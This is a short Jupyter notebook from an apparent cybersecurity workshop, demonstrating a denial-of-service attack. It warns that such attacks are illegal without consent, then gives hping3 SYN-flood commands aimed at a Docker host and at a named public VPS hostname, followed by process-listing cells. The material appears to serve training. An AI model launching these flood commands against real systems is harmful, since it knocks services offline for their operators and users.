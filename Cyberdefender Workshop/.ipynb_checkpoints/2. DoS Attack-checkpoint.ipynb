{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "demanding-ceramic",
   "metadata": {},
   "source": [
    "# DoS Attack\n",
    "Remmeber DoS Attack is an illegal without consent"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "conceptual-keyboard",
   "metadata": {},
   "source": [
    "## On Docker / Internal Network"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "uniform-california",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 agent"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "becoming-swift",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "opposed-wednesday",
   "metadata": {},
   "source": [
    "## VPS on DigitalOcean"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "usual-metropolitan",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 doblog-uow.1ez.xyz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fifty-replica",
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
